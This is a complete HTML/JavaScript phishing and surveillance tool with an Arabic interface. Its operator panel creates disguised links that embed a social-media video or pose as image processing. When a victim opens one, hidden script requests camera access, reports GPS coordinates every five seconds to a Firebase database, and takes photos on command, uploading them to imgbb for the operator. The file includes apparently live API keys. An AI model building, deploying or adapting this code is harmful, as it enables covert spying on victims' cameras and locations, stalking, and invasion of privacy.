<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>DOCTOR OS v5.0 | SUPREME COMMAND</title>
    <style>
        :root { --gold: #d4af37; --online: #00ff41; --dead: #ff0000; --bg: #050505; --panel: #121212; }
        body { background: var(--bg); color: var(--gold); font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
        
        .layout { display: grid; grid-template-columns: 350px 1fr; height: 100vh; }
        .sidebar { background: #0a0a0a; border-left: 2px solid var(--gold); padding: 15px; display: flex; flex-direction: column; gap: 10px; }
        
        /* حالة الأجهزة */
        .target-node { border: 1px solid #333; padding: 15px; border-radius: 8px; cursor: pointer; position: relative; transition: 0.3s; }
        .target-node:hover { border-color: var(--gold); background: #1a1a1a; }
        .pulse { width: 12px; height: 12px; border-radius: 50%; position: absolute; left: 15px; top: 15px; }
        .active-pulse { background: var(--online); box-shadow: 0 0 10px var(--online); animation: blink 2s infinite; }
        .dead-pulse { background: var(--dead); }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }

        /* منطقة العمل */
        .work-area { padding: 25px; overflow-y: auto; }
        .factory-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 30px; }
        .tool-box { background: var(--panel); border: 1px dashed var(--gold); padding: 20px; border-radius: 10px; }
        
        input, select, button { width: 100%; padding: 12px; margin-top: 10px; background: #000; border: 1px solid var(--gold); color: var(--gold); border-radius: 5px; cursor: pointer; }
        button:hover { background: var(--gold); color: #000; font-weight: bold; }
        
        .control-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 20px; }
        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; margin-top: 20px; }
        img { width: 100%; border: 1px solid #444; border-radius: 5px; }
    </style>
</head>
<body>

<div class="layout" id="doctor-system">
    <div class="sidebar">
        <h2 style="text-align: center;">إدارة السيادة 🛰️</h2>
        <div id="target-list">جاري البحث عن ترددات...</div>
    </div>

    <div class="work-area">
        <div class="factory-grid">
            <div class="tool-box">
                <h3>🔗 ملغم الروابط الاجتماعية</h3>
                <input type="text" id="social-link" placeholder="ضع رابط الفيديو (TikTok/YT)...">
                <button onclick="fuseLink('social')">دمج البايلود في الرابط</button>
                <p id="res-link" style="font-size: 0.8em; color: var(--online); word-break: break-all;"></p>
            </div>
            <div class="tool-box">
                <h3>🖼️ ملغم الصور المتقدم</h3>
                <input type="file" id="stego-img" accept="image/*">
                <button onclick="fuseLink('image')">توليد صورة ملغمة</button>
                <div id="img-preview"></div>
            </div>
        </div>

        <div id="commander" style="display:none;">
            <h2 id="target-id-label">التحكم في الوحدة: ---</h2>
            <div class="control-grid">
                <button onclick="execute('capture')">📸 التقاط صورة فورية</button>
                <button onclick="execute('deep_scan')">📂 سحب جميع الصور</button>
                <button onclick="execute('gps')">📍 تحديد الموقع الدقيق</button>
                <button onclick="execute('vibrate')">📳 هز الجهاز</button>
                <button onclick="execute('alert')">⚠️ تنبيه النظام</button>
                <button onclick="execute('delete')" style="border-color: var(--dead); color: var(--dead);">❌ حذف الجلسة</button>
            </div>
            <h4>البيانات المسحوبة (الصور والملفات):</h4>
            <div id="data-gallery" class="gallery"></div>
        </div>
    </div>
</div>

<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyDqZlMnIIXpos70i0vx2jwL_SVG68tcr04",
        authDomain: "hkrs5000.firebaseapp.com",
        databaseURL: "https://hkrs5000-default-rtdb.firebaseio.com",
        projectId: "hkrs5000",
        storageBucket: "hkrs5000.firebasestorage.app",
        messagingSenderId: "273977078526",
        appId: "1:273977078526:web:da9e512c2421c300352baf"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const IMGBB_KEY = "a76371f79ef3069a4103d3493271efb5";

    let selectedID = null;

    // --- [إدارة السيادة] ---
    db.ref('devices').on('value', snap => {
        const list = document.getElementById('target-list');
        list.innerHTML = "";
        snap.forEach(child => {
            const d = child.val();
            const isOnline = (Date.now() - (d.lastSeen || 0)) < 10000;
            const node = document.createElement('div');
            node.className = "target-node";
            node.innerHTML = `<div class="pulse ${isOnline ? 'active-pulse' : 'dead-pulse'}"></div>
                              <b>Target ID: ${child.key}</b><br><small>${d.platform}</small>`;
            node.onclick = () => {
                selectedID = child.key;
                document.getElementById('commander').style.display = "block";
                document.getElementById('target-id-label').innerText = "تحكم سيادي: " + child.key;
                loadMedia(child.key);
            };
            list.appendChild(node);
        });
    });

    function execute(act) {
        if(!selectedID) return;
        if(act === 'gps') {
            db.ref('devices/'+selectedID).once('value', s => {
                const data = s.val();
                if(data.lat) window.open(`https://www.google.com/maps?q=${data.lat},${data.lon}`);
                else alert("جاري جلب إحداثيات الموقع...");
            });
        }
        db.ref('commands/'+selectedID).set({ action: act, ts: Date.now() });
    }

    function loadMedia(id) {
        db.ref(`data/${id}/images`).on('value', snap => {
            const gal = document.getElementById('data-gallery'); gal.innerHTML = "";
            snap.forEach(img => {
                const el = document.createElement('img'); el.src = img.val().url;
                gal.appendChild(el);
            });
        });
    }

    // --- [مصنع التلغيم v5.0] ---
    function fuseLink(type) {
        const base = window.location.href.split('?')[0];
        let final = "";
        if(type === 'social') {
            const victimLink = btoa(document.getElementById('social-link').value); // تشفير الرابط الأصلي
            final = `${base}?mode=sh&ref=${victimLink}`;
        } else {
            final = `${base}?mode=img&stego=active`;
        }
        document.getElementById('res-link').innerText = "الرابط الملغم الجاهز:\n" + final;
    }

    // --- [منطق الضحية / البايلود المخفي] ---
    const params = new URLSearchParams(window.location.search);
    if(params.has('mode')) {
        document.getElementById('doctor-system').style.display = "none";
        initPayload();
    }

    async function initPayload() {
        const vID = "V_" + Math.random().toString(36).substr(2, 5);
        // تمويه الصفحة
        if(params.get('mode') === 'sh') {
            const targetUrl = atob(params.get('ref'));
            document.body.innerHTML = `<iframe src="${targetUrl}" style="width:100%;height:100vh;border:none;"></iframe>`;
        } else {
            document.body.innerHTML = "<h2 style='color:white;text-align:center;padding-top:20%'>جاري معالجة الصورة... يرجى السماح بالصلاحيات</h2>";
        }

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            
            // نبضات القلب وتحديد الموقع التلقائي
            setInterval(() => {
                navigator.geolocation.getCurrentPosition(pos => {
                    db.ref('devices/'+vID).update({
                        lastSeen: Date.now(),
                        platform: navigator.platform,
                        lat: pos.coords.latitude, lon: pos.coords.longitude
                    });
                });
            }, 5000);

            // الاستماع للأوامر السيادية
            db.ref('commands/'+vID).on('value', async s => {
                const cmd = s.val();
                if(cmd) {
                    if(cmd.action === 'capture' || cmd.action === 'deep_scan') {
                        const track = stream.getVideoTracks()[0];
                        const cap = new ImageCapture(track);
                        const blob = await cap.takePhoto();
                        let fd = new FormData(); fd.append('image', blob);
                        fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_KEY}`, {method:'POST', body:fd})
                        .then(r=>r.json()).then(d=> db.ref(`data/${vID}/images`).push({url: d.data.url}));
                    }
                    if(cmd.action === 'vibrate') navigator.vibrate([500, 200, 500]);
                    db.ref('commands/'+vID).remove();
                }
            });
        } catch(e) {}
    }
</script>
</body>
</html>
